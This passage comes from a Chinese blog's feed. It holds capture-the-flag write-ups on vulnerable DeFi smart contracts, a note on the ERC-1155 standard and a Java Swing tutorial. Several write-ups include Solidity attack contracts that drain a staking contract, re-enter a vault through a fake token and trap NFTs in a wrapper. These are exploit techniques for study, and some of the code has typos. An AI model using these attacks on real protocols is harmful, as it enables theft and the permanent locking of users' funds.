class="line">&#125;</span><br></pre></td></tr></table></figure><p>攻击思路：首先使用攻击合约调用deposit函数，存入大量的代币，然后接收方回调攻击合约的delegatedTransferERC20函数，向实现把代币转入。但是，攻击合约没有实现这delegatedTransferERC20个功能，而被攻击的合约也并没有检查，所以就给攻击合约大量的股份，最后再实现withdraw函数功能，将攻击者合约中的xFARM，转换回 FARM,再转移给攻击者自己。</p><p>个人认为，外部调用，要进行检查，严格的审查是否实现了合理的要求。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-tasty-stake</title>
      <link href="/2024/10/23/CTF-tasty-stake/"/>
      <url>/2024/10/23/CTF-tasty-stake/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-tasty-stake"><a href="#CTF-tasty-stake" class="headerlink" title="CTF-tasty-stake"></a>CTF-tasty-stake</h1><p>题目源码<a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf/tree/implement/contracts/tasty-stake">点击</a></p><p>题目要求： 有个TastyStaking 合约，该合约允许您质押 STEAK 以种植 BUTTER 代币。您的任务是从质押合约中耗尽所有 STEAK 代币。</p><p>首先这个合约是个单合约，实现的功能的挺多的，阅读了很久，看了一下它的提示：所有输入都经过了适当的验证吗？</p><p>看来又是参数有问题，来到合约最后，migrateStake合约实现的代币质押的转移</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function migrateStake(address oldStaking, uint256 amount) external &#123;</span><br><span class="line">        TastyStaking(oldStaking).migrateWithdraw(msg.sender, amount);</span><br><span class="line">        _applyStake(msg.sender, amount);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>但是关键来了。对于这个oldStaking,这个函数并没有有什么检查举动，回想前几天刚做的Safu Valut题，和它有点类似，都是没有对外部调用进行一个检查，那么这个题旧很好的解决了</p><p>攻击合约：</p><pre><code>contract Attack &#123;     address owner;     TastyStaking _tastyStaking;     Token stakingToken;     constructor(address _target, address _stakingToken)       &#123;         attacker = msg.sender;         _tastyStaking = TastyStaking(_target);          stakingToken = Token(_stakingToken);        &#125;     function migrateWithdraw(address staker, uint256 amount) externa&#123; &#125;         function pwn() external &#123;        //传入的攻击合约的地址，也就是旧地址，         _tastyStaking.migrateStake(address(this), stakingToken.balanceOf(address(_tastyStaking)));          _tastyStaking.withdrawAll(false);          stakingToken.transfer(attacker, stakingToken.balanceOf(address(this)));          &#125; &#125;这个逻辑就是，攻击合约伪装成旧抵押合约地址，取得TastyStaking合约的信任后，再执行的withdrawall函数具体：攻击者伪装成旧合约地址调用TastyStaking合约中的migrateStake函数，然后TastyStaking合约接受到转移的信号，又去旧合约中调用migrateWithdraw函数，提取被转移的代币，但是攻击合约并没有实现migrateWithdraw函数的功能，而TastyStaking合约也没有进行验证，就误以为收到转移的代币，实际没有。这样攻击合约取得了信任，然后就调用TastyStaking合约中withdrawall函数，获得了TastyStaking合约中的所有代币。</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-safu-wallet</title>
      <link href="/2024/10/23/CTF-safu-wallet/"/>
      <url>/2024/10/23/CTF-safu-wallet/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-safu-wallet"><a href="#CTF-safu-wallet" class="headerlink" title="CTF-safu-wallet"></a>CTF-safu-wallet</h1><p>题目源码<a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf/tree/implement/contracts/safu-wallet">点击</a>。</p><p>题目要求：这是一个多签名钱包，已经有一位顾客存入钱，然后你要将它的钱永远困住在这个钱包里</p><p>首先看到合约代码：很清晰的辨别了，SafuWallet合约是代理合约，SafuWalletLibrary合约是逻辑合约，这样分开，就好理解了<br>对于多签名钱包，我的理解就是，不止一个管理员，至少要俩个管理员就可以管理这个钱包了。</p><p>逻辑合约里有kill函数，如果能调用，这应该是最便捷的解题方式了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function kill(address _to) onlymanyowners(sha3(msg.data)) external &#123;</span><br><span class="line">    suicide(_to);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>很遗憾的是，有个<code>onlymanyowners</code>限制，这也就是多签名钱包的魅力了吧。</p><p>看到代理合约中，构造函数还是有点东西。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">constructor(address[] memory _owners, uint _required, uint _daylimit) &#123;</span><br><span class="line">   bytes memory data = abi.encodeWithSignature(</span><br><span class="line">     &quot;initWallet(address[],uint256,uint256)&quot;,</span><br><span class="line">     _owners,</span><br><span class="line">     _required,</span><br><span class="line">     _daylimit</span><br><span class="line">   );</span><br><span class="line"></span><br><span class="line">   _safuWalletLibrary.functionDelegateCall(data);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>又是熟悉的<code>delegatecall</code>,代理合约委托调用了逻辑合约里的initWallet函数，执行环境是在代理合约，改变的状态变量也是在代理合约中，也就是说在代理合约中，这个所有者是可以改变的，如果只有我们自己，那么就可以成为多签名钱包的唯一所有者，然后再调用逻辑合约里的kill函数，传入代理合约的地址，销毁它，这样就不需要其他人的所有者的同意，就可以销毁，那位存钱的人，想要取钱，是不行的。</p><p>还有一种情况就是把所有者列表都设置为空，然后再调用kill函数时就没有任何所有者确认了。</p><p>攻击思路：<br>改变所有者的列表，将他们设置为空。调用<code>safuWalletLibrary.initWallet(addresses(0), 1, type(uint).max)</code>,设置要求，只需要一个确认就可以执行操作。最后调用kill函数，即可。</p><p>个人认为：就是逻辑合约里的kill函数没有任何限制，只要所有者列表为空，或者攻击者成为了所有者，都可以调用。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-free-Lunch</title>
      <link href="/2024/10/23/CTF-free-Lunch/"/>
      <url>/2024/10/23/CTF-free-Lunch/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-free-Lunch"><a href="#CTF-free-Lunch" class="headerlink" title="CTF-free-Lunch"></a>CTF-free-Lunch</h1><p>题目来源：<a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf/tree/implement/contracts/free-lunch">点击</a></p><p>首先这个代币只有一个合约，还是容易理解。如果对<code>unswap V2</code>有了解的话，会更好的理解合约。发现漏洞。<br>要了解流动池<a href="https://www.binance.com/zh-CN/square/post/139279">点击</a>,</p><p>题目要求是：我们初始有俩个代币，让我们通过这个SafuMaker合约后，翻倍50，并且要耗尽这个合约的资金。</p><p>攻击流程（这道题没有思路，或者是说对流动性的了解太少了，看了测试合约，发现这个思路真的让我茅舍顿开，或者是，题目还是做少了）：</p><p>添加流动性并获得 LP 代币：</p><ul><li>攻击者首先向 SAFU-USDC 流动性池添加流动性，例如存入 10 USDC 和 10 SAFU。这一步使得攻击者获得相应数量的 LP 代币，代表他们在流动性池中的份额。</li></ul><p>创建新流动性池：</p><ul><li>攻击者使用获得的 LP 代币与 SAFU 代币创建一个新的流动性池。这一步增加了攻击者的流动性控制能力。</li></ul><p>转移 LP 代币并进行转换：</p><ul><li>攻击者将 10% 的新流动性池的 LP 代币转移到 safuMaker 合约，并调用其 convert 方法。这通常会激活一些机制，例如将 LP 代币转换为 SAFU 代币或其他奖励。</li></ul><p>代币交换：</p><ul><li>攻击者使用路由合约执行代币交换，将 SAFU 代币转换为 SAFU-Pair LP 代币。这一步骤允许攻击者利用价格差异获取更多的 LP 代币。</li></ul><p>移除流动性并提取资产：</p><ul><li>攻击者移除流动性池中的所有资产，这会将他们的 LP 代币转换为基础的 USDC 和 SAFU 代币。<br>由于在流动性池中不断进行交易、提供流动性以及获取奖励，攻击者的最终余最终余额大幅增加。</li></ul><p>攻击者成功的关键在于对流动性池机制的利用，通过不断添加流动性、转移 LP 代币和进行代币交换，攻击者能够有效增加其代币余额，最终实现经济利益的获取。</p><p>个人认为就像无中生有一样，更像一种欺骗，不过这样确实也能获利</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-game-assets</title>
      <link href="/2024/10/22/CTF-game-assets/"/>
      <url>/2024/10/22/CTF-game-assets/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-game-asserts"><a href="#CTF-game-asserts" class="headerlink" title="CTF-game-asserts"></a>CTF-game-asserts</h1><p>题目源码:<a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf/tree/implement/contracts/game-assets">点击</a></p><p>题目说明：GG labs 刚刚发布了他们的 nOtApOnZi 游戏，该游戏允许将多个 WLed NFT 用作游戏内物品。为了集成多个 ERC721 代币，他们有一个包装合约 （ERC1155） 来包装 NFT，允许它们在游戏中使用。用户也可以在使用完 NFT 后解包它们。您的任务是将用户的 NFT 困在包装合约中并使他们无法挽回，从而使用户感到悲伤</p><p>这个一实现了游戏里的资产转化，首先AssetHolder合约中，就是资产的说明，具体实现有点多，这里就不深究了，AssetWrapper合约就是我们重点要说的了，他是一个包装合约，因为这个游戏使用的ERC1155代币规则，所以在进行包装的时候，要对用户进行返回代币是，就会触发一个隐藏的接受函数，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function onERC1155BatchReceived(</span><br><span class="line">       address operator,</span><br><span class="line">       address from,</span><br><span class="line">       uint256[] calldata ids,</span><br><span class="line">       uint256[] calldata values,</span><br><span class="line">       bytes calldata data</span><br><span class="line">   ) external override returns (bytes4) &#123; &#125;</span><br></pre></td></tr></table></figure><p>bytes4返回值是固定的，如果就是在返回值这里动手脚了，那么包装就会不成功，资产就会被困住。</p><p>这个题要先去了解ERC1155代币标准，我自己对于这个ERC-1155的了解<a href="ERC1155.md">点击</a>,漏洞已在这里面说明，就是一个必须注意的地方，我觉得也是ERC1155的一个弊端吧</p><p>攻击代码如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//SPDX-Linsence-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity^ 0.8.17;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC1155/utils/ERC1155Receiver.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface AssetWrapper &#123;</span><br><span class="line">    function wrap(uint256 nftId,address assetOwner,address assetAddress) external;</span><br><span class="line">    function unwrap (address assetOwner,address assetAddress) external ;</span><br><span class="line">&#125;</span><br><span class="line">contract Hack is ERC1155Receiver&#123;</span><br><span class="line">          IAssetWrapper wrapper;</span><br><span class="line">          address attracker;</span><br><span class="line">           address nftAddress;</span><br><span class="line"></span><br><span class="line">           constructor(address _wrapper,address _attracker)&#123;</span><br><span class="line">            wrapper = IAssetWrapper(_wrapper);</span><br><span class="line">            attracker = attracker;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           function pwn(uint256 nftId,address assetAddress) exteranl&#123;</span><br><span class="line">             nftAddress = assetAddress;</span><br><span class="line">             wrapper.wrap(nftId,address(this),assetAddress);</span><br><span class="line"></span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           function onERC1155Received(address operator,address from,address id,uint256 value,bytes calldata)</span><br><span class="line">           exteranl returns(bytes4)&#123;</span><br><span class="line">             require(msg.sender == address(wrapper), &quot;invalid callback&quot;);</span><br><span class="line"></span><br><span class="line">               wrapper.unwrap(address(this), nftAddress); // change ownership to this contract</span><br><span class="line"></span><br><span class="line">                 return bytes4(keccak256(&quot;onERC1155Received(address,address,uint256,uint256,bytes)&quot;));</span><br><span class="line">           &#125;</span><br><span class="line">           function onERC1155BatchReceived(</span><br><span class="line">        address operator,</span><br><span class="line">        address from,</span><br><span class="line">        uint256[] calldata ids,</span><br><span class="line">        uint256[] calldata values,</span><br><span class="line">        bytes calldata data</span><br><span class="line">    ) external override returns (bytes4) &#123;</span><br><span class="line">        return bytes4(0); // 返回了bytes(0),与本来标准不符合。</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>即可，个人认为这道题的考察点就是对ERC1155代币规则要熟悉。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ERC1155</title>
      <link href="/2024/10/22/ERC1155/"/>
      <url>/2024/10/22/ERC1155/</url>
      
        <content type="html"><![CDATA[<h1 id="ERC1155"><a href="#ERC1155" class="headerlink" title="ERC1155"></a>ERC1155</h1><p>多代币标准</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>用于多种代币管理的合约标准接口。 单个部署的合约可以包括同质化代币、非同质化代币或其他配置（如半同质化代币）的任何组合。</p><p>多代币标准是什么？</p><p>它的目的很单纯，就是创建一个智能合约接口，可以代表和控制任何数量的同质化和非同质化代币类型。 这样一来，ERC-1155 代币就具有与 ERC-20 和 ERC-721 代币相同的功能，甚至可以同时使用这两者的功能。 它改进了 ERC-20 和 ERC-721 标准的功能，提升了效率并纠正了实现中的明显错误。</p><h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><h3 id="批量传输"><a href="#批量传输" class="headerlink" title="批量传输"></a>批量传输</h3><p>通过一次合约调用传输多种资产</p><p>就是不单是一种代币可以传输，很多种代币都可以传输</p><p>来看看，他与ERC20传输合约的比较</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// ERC-20</span><br><span class="line">function transferFrom(address from, address to, uint256 value) external returns (bool);</span><br><span class="line"></span><br><span class="line">// ERC-1155</span><br><span class="line">function safeBatchTransferFrom(</span><br><span class="line">    address _from,</span><br><span class="line">    address _to,</span><br><span class="line">    uint256[] calldata _ids,</span><br><span class="line">    uint256[] calldata _values,</span><br><span class="line">    bytes calldata _data</span><br><span class="line">) external;</span><br></pre></td></tr></table></figure><p>ERC-1155 中唯一的区别是我们将值作为数组传递，同时也传递了 ids 数组。 例如，给出 ids&#x3D;[3, 6, 13] 和 values&#x3D;[100, 200, 5]，传输结果将是</p><ul><li>将 id 3 的 100 个代币从 _from 传输到 _to。</li><li>将 id 6 的 200 个代币从 _from 传输到 _to。</li><li>将 id 13 的 5 个代币从 _from 转移到 _to。<br>在 ERC-1155 中，我们只有 transferFrom，没有 transfer。 要像常规的 transfer一样使用它，只需将 “from” 地址设为调用该函数的地址。</li></ul><h3 id="批量余额"><a href="#批量余额" class="headerlink" title="批量余额"></a>批量余额</h3><p>在一次调用中获取多个资产的余额</p><p>相应的 ERC-20 balanceOf 调用同样具有支持批处理的相应函数。 还是做个对比</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// ERC-20</span><br><span class="line">function balanceOf(address owner) external view returns (uint256);</span><br><span class="line"></span><br><span class="line">// ERC-1155</span><br><span class="line">function balanceOfBatch(</span><br><span class="line">    address[] calldata _owners,</span><br><span class="line">    uint256[] calldata _ids</span><br><span class="line">) external view returns (uint256[] memory);</span><br></pre></td></tr></table></figure><p>调用余额查询更简单的是，我们可以在单次调用中获取多个余额。 参数中传递所有者帐户数组和代币的 id 数组。</p><p>例如，对于给出的 _ids&#x3D;[3, 6, 13] 和 _owners&#x3D;[0xbeef…, 0x1337…, 0x1111…]，返回值将为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">    balanceOf(0xbeef...),</span><br><span class="line">    balanceOf(0x1337...),</span><br><span class="line">    balanceOf(0x1111...)</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h3 id="批量审批"><a href="#批量审批" class="headerlink" title="批量审批"></a>批量审批</h3><p>审批同一地址的所有代币</p><p>还是来看一下ERC115</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// ERC-1155</span><br><span class="line">function setApprovalForAll(</span><br><span class="line">    address _operator,</span><br><span class="line">    bool _approved</span><br><span class="line">) external;</span><br><span class="line"></span><br><span class="line">function isApprovedForAll(</span><br><span class="line">    address _owner,</span><br><span class="line">    address _operator</span><br><span class="line">) external view returns (bool);</span><br></pre></td></tr></table></figure><p>审批过程与 ERC-20 略有不同。 这里不是批准特定金额，而是通过 setApprovalForAll 函数设置操作帐户为已批准或未批准。</p><p>查看当前的审批状态可以通过 isApprovedForAll 完成。 如你所见，要么全部批准，要么不批准。 不能定义要批准代币的数量，甚至代币类型。</p><p>这是考虑到简洁性而故意设计的。 你只能批准一个地址的所有代币。</p><h3 id="接受钩子"><a href="#接受钩子" class="headerlink" title="接受钩子"></a>接受钩子</h3><p>接受钩子的代币函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function onERC1155BatchReceived(</span><br><span class="line">    address _operator,</span><br><span class="line">    address _from,</span><br><span class="line">    uint256[] calldata _ids,</span><br><span class="line">    uint256[] calldata _values,</span><br><span class="line">    bytes calldata _data</span><br><span class="line">) external returns(bytes4);</span><br></pre></td></tr></table></figure><p>基于 EIP-165(opens in a new tab) 的协议支持，ERC-1155 只支持智能合约的接收钩子函数。 钩子函数必须返回一个事先预定义的 4 字节值，这个值被指定为：<code>bytes4(keccak256(&quot;onERC1155BatchReceived(address,address,uint256[],uint256[],bytes)&quot;))</code><br>当接收合约返回这一值时，意味着合约知道如何处理 ERC-1155 代币并接受转账。 太好了，代币不会再卡在合约中了！（这里可能会是漏洞，比如<a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf/tree/implement/contracts/game-assets">点击</a>这个题就是使用到了钩子，让代币困在合约中）</p><h3 id="安全转账"><a href="#安全转账" class="headerlink" title="安全转账"></a>安全转账</h3><p> 现在我们来看一下最重要的规则：</p><p>1，调用者必须获得批准才能从 _from 的帐户地址消费代币，或者调用者帐户地址必须与 _from 的帐户地址相同。<br>2，在以下情况下，转账调用将回退</p><ul><li>_to 地址为 0；</li><li>_ids 的长度与 _values 的长度不同；</li><li>_ids 中代币持有者的任何余额低于发送给接收者的相应 _value 金额。出现任何其他错误。<blockquote><p>注意：包括钩子在内的所有批处理函数也均作为非批处理的版本存在。 这样做是为了提高燃料效率，考虑到只转移一种资产可能仍然是最常用的方式。 简洁起见，我们没有在这里介绍这些非批处理的版本，包括安全转账规则。 名称是相同的，只需移除 ‘Batch’。</p></blockquote></li></ul><h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><p>IERC1155接口，接口中定义了六个函数</p><ul><li>balanceOf()：单币种余额查询，返回account拥有的id种类的代币的持仓量。</li><li>balanceOfBatch()：多币种余额查询，查询的地址accounts数组和代币种类ids数组的长度要相等。</li><li>setApprovalForAll()：批量授权，将调用者的代币授权给operator地址。。</li><li>isApprovedForAll()：查询批量授权信息，如果授权地址operator被account授权，则返回true。</li><li>safeTransferFrom()：安全单币转账，将amount单位id种类的代币从from地址转账给to地址。如果to地址是合约，则会验证是否实现了onERC1155Received()接收函数。</li><li>safeBatchTransferFrom()：安全多币转账，与单币转账类似，只不过转账数量amounts和代币种类ids变为数组，且长度相等。<strong>如果to地址是合约，则会验证是否实现了onERC1155BatchReceived()接收函数。</strong>（重点）</li></ul><p>如果ERC1155TOKEN的接收者receiver是一个合约地址，那么接收者必须要实现该接口。</p><p>该接口有两个函数：（前提是接收者是合约地址）：</p><ul><li>onERC1155Received：这个函数是在调用 ERC1155的 safeTransferFrom()和 _mint()时，接收者的该函数会被调用，并按要求返回指定的值 bytes4(keccak256(“onERC1155Received(address,address,uint256,uint256,bytes)”))。</li><li>onERC1155BatchReceived：这个函数时在调用 ERC1155的 safeBatchTransferFrom()时，接收者的该函数会被调用，并按要求返回指定的值 bytes4(keccak256(“onERC1155BatchReceived(address,address,uint256[],uint256[],bytes)”))</li></ul><p>如果我们不按要求返回一个指定值，那么代币就会转移不出来，困在合约中。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java_学生管理系统</title>
      <link href="/2024/10/21/java-%E5%AD%A6%E7%94%9F%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/"/>
      <url>/2024/10/21/java-%E5%AD%A6%E7%94%9F%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近要做个一java的学生管理系统，要一段很长时间，还是从零开始，所以就记个笔记，记录一下自己的学习知识，感觉和之前学的网页面有一些知识的关联。</p><p>采用一个java+Swing的框架，</p><h2 id="Swing"><a href="#Swing" class="headerlink" title="Swing"></a>Swing</h2><p>Swing 是一个为Java设计的GUI工具包。</p><p>GUI（图形用户界面）为程序提供图形界面，它最初的设计目的是为程序员构建一个通用的 GUI，使其能够在所有的平台上运行，但 Java 1.0 中基础类 AWT（抽象窗口工具箱）并没有达到这个要求，于是 Swing 出现了，它是 AWT 组件的增强组件，但是它又不能完全替代 AWT 组件，这两种组件需要同时出现在一个图形用户界面中。</p><p>Swing包括了图形用户界面（GUI）器件如：文本框，按钮，分隔窗格和表。</p><p>Swing提供许多比AWT更好的屏幕显示元素。它们用纯Java写成，所以同Java本身一样可以跨平台运行，这一点不像AWT。它们是JFC的一部分。它们支持可更换的面板和主题（各种操作系统默认的特有主题），然而不是真的使用原生平台提供的设备，而是仅仅在表面上模仿它们。这意味着你可以在任意平台上使用JAVA支持的任意面板。轻量级组件的缺点则是执行速度较慢，优点就是可以在所有平台上采用统一的行为。</p><p>我理解的就是一个模拟的软件，类似于UI网页设计</p><h3 id="Swing包"><a href="#Swing包" class="headerlink" title="Swing包"></a>Swing包</h3><p>有三个比较重要的包，Component类，Cotainer类，JComponent类，<br>层次和继承关系：<br>Java.lang.Object-&gt;Java.awt-&gt;Component-&gt;Java.awt.Container-&gt;Javax.swing.JComponent</p><p>Swing 组件中的大多数 GUI 组件都是 Component 类的直接子类或间接子类，JComponent 类是 Swing 组件各种特性的存放位置，这些组件的特性包括设定组件边界、GUI 组件自动滚动等。</p><p>Swing 组件中的最重要的父类是 Container 类，Container 类又有两个最重要的子类，分别为 java.awt.Window 与 java.awt.Frame。除了以往的 AWT 类组件会继承这两个类之外，现在的 Swing 组件同样也会扩展了这两个类</p><h3 id="常见的组件"><a href="#常见的组件" class="headerlink" title="常见的组件"></a>常见的组件</h3><p>JButton :按钮，可以带一些图片或者文字<br>JCheckBox :复选框<br>JComBox :下拉列表框，可以在下拉显示区域多个选项<br>JFrame : 框架类<br>JDialog :对话框<br>JLable :标签组件<br>JRadioButton :单选按钮<br>JList :能够在用户中显示一些列条目的组件<br>JTextField :文本框<br>JPasswordField :密码框<br>JTextArea :文本区域<br>JOptionPane :一些面板</p><h3 id="常见的顶层窗体"><a href="#常见的顶层窗体" class="headerlink" title="常见的顶层窗体"></a>常见的顶层窗体</h3><p>窗体作为 Swing 应用程序中组件的承载体，处于非常重要的位置。Swing 中常用的窗体包括 JFrame 和 JDialog 窗体</p><h4 id="JFrame框架"><a href="#JFrame框架" class="headerlink" title="JFrame框架"></a>JFrame框架</h4><p>JFrame 窗体是一个容器，它是 Swing 程序中各个组件的载体，因此，可以将 JFrame 看作是承载这些 Swing 组件的容器。</p><p>在开发应用程序时，可以通过继承 java.swing.JFrame 类来创建一个窗体，然后再在窗体中添加组件，同时为组件设置事件。由于该窗体继承了 JFrame 类，所以它拥有最大化、最小化和关闭按钮。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JFrame frame = new JFrame(title);</span><br><span class="line">Container container = frame.getContentPane();</span><br></pre></td></tr></table></figure><ul><li>frame：JFrame 类的对象。</li><li>container：Container 类的对象，可以使用 JFrame 对象调用getContentPane() 方法获取。</li></ul><p>我们应该有这样的一个概念，就是 Swing 组件的窗体通常与组件和容器相关，所以在 JFrame 对象创建完成后，需要调用 getContentPane() 方法将窗体转换为容器，然后在容器中添加组件或设置布局管理器。通常这个容器用来包含和显示组件。如果需要将组件添加至容器，那么可以使用来自 Container 类的 add() 方法进行设置，示例代码如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">container.add(new JButton(&quot;按钮&quot;));                     //JButton按钮组件</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-SafuVault</title>
      <link href="/2024/10/20/CTF-SafuVault/"/>
      <url>/2024/10/20/CTF-SafuVault/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-SafuVault"><a href="#CTF-SafuVault" class="headerlink" title="CTF-SafuVault"></a>CTF-SafuVault</h1><p>这个题的源代码<a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf/tree/implement/contracts/safu-vault">这里</a></p><p>题目要求就是：获得不少于保险库的90%代币</p><p>还是先阅读代码，合约<code>SafeVault</code>,是一个安全的收益金库，用于用户存入代币，然后金库会调用策略合约 <code>SafuVault</code>的<code>deposit</code>函数将存入的代币进行投资，用户通过<code>withdraw</code>函数提取它们的代币，其中还有个<code>depositFor</code>函数，允许其他用户为其他人存款，这个收益合约看起来还是功能挺齐全的。<br>而收益生成合约 <code>SafuStrategy</code>,就是来管理存入金库的资金，要想获得资金的话，还是的同通过金库合约，反复查看这个合约的，开始时并没有发现获得资金的方法，查看了提示：所有外部功能都得到妥善保护吗？又去看了金库合约的函数，发现<code>deposit</code>和<code>depositFor</code>函数修饰限定不一样，具体看一下代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function deposit(uint256 _amount) public nonReentrant &#123;</span><br><span class="line">        strategy.beforeDeposit();</span><br><span class="line"></span><br><span class="line">        uint256 _pool = balance();</span><br><span class="line">        want().safeTransferFrom(msg.sender, address(this), _amount);</span><br><span class="line">        earn();</span><br><span class="line">        uint256 _after = balance();</span><br><span class="line">        _amount = _after - _pool; // Additional check for deflationary tokens</span><br><span class="line"></span><br><span class="line">        uint256 shares;</span><br><span class="line">        if (totalSupply() == 0) &#123;</span><br><span class="line">            shares = _amount;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            shares = (_amount * totalSupply()) / (_pool);</span><br><span class="line">        &#125;</span><br><span class="line">        _mint(msg.sender, shares);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">function depositFor(</span><br><span class="line">        address token, </span><br><span class="line">        uint256 _amount, </span><br><span class="line">        address user</span><br><span class="line">    ) public &#123;</span><br><span class="line">        strategy.beforeDeposit();</span><br><span class="line"></span><br><span class="line">        uint256 _pool = balance();</span><br><span class="line">        IERC20(token).safeTransferFrom(msg.sender, address(this), _amount);</span><br><span class="line">        earn();</span><br><span class="line">        uint256 _after = balance();</span><br><span class="line">        _amount = _after - _pool; // Additional check for deflationary tokens</span><br><span class="line"></span><br><span class="line">        uint256 shares;</span><br><span class="line">        if (totalSupply() == 0) &#123;</span><br><span class="line">            shares = _amount;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            shares = (_amount * totalSupply()) / (_pool);</span><br><span class="line">        &#125;</span><br><span class="line">        _mint(user, shares);</span><br><span class="line">    &#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>deposit</code>函数有防止重入的功能，而<code>depositFor</code>没有，这是就会联想到，会不会就是重入攻击，再比较这俩个合约，发现<code>depositFor</code>使用了<code>token</code>地址作为参数传入，这个给了很大的操作空间，如果在<code>token</code>地址上进行转账的transfer函数中夹带一个再次存款合约的话，就会进行一个重入攻击，反复存款，最后再<code>withdrawall</code>.就能获得大量的代币</p><p>具体的攻击合约</p><pre><code>// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;interface IValue &#123;    function depositFor(        address token,         uint256 _amount,         address user    ) internal;    function withdrawAll() external ;    &#125; contract Hack &#123;    IERC20 token;    IValue value;    uint256 loop = 10;    constructor (address _token,address _value)&#123;        token = IERC20(_token);        value = IValue(_value);    &#125;    function pwn() external&#123;        //计算重入几次，获得超过金库合约的90%代币        uint256 amount = token.balanceOf(address(this));        uint256 amount1 = amount /10;        value.depositFor(address(this),amount1,address(this));        value.withdraw();        //此时的msg.sender是我们自己，因为是我们发起pwn        token.transfer(msg.sender,token.balanceOf(address(this)));        &#125;    function transferFrom(address from,address to,address amount1) external&#123;        if(loop&lt;10)&#123;           //此时的msg.sender是金库合约，因为是Value发起的存钱            transfer(msg.sender,amount1);            //执行重入，再次存款            token.depositFor(address(this),amount1,address(this));                     &#125;    &#125; &#125;简单来说，就是我们的攻击合约扮演一个ERC20代币合约，正是由于depoistFor函数将token地址作为参数，这样我们就能改变token地址里的transferFrom函数的内容，进行重入攻击,个人认为就是有一个跨合约的重入攻击，对于ERC20代币必须要有了解。完成。</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EIP-1559</title>
      <link href="/2024/10/20/EIP-1559/"/>
      <url>/2024/10/20/EIP-1559/</url>
      
